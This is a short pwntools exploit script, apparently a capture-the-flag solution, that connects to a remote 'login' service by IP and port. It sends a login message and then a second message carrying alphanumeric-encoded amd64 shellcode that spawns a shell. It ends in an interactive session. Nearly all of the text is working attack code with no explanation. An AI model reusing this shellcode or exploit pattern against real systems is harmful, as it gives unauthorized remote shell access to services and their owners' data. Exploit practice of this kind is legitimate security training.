from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "Linux", log_level = "Debug")
io = process("./login")
io = remote("101.201.144.12", 23144)
# gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

payload = "RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZPT"

ru(">>> ")
pause()
s("msg:ro0tt\nopt:1\n\r\n")
ru(">>> ")
s("msg:" + payload + "\nopt:2\n\r\n")
itr()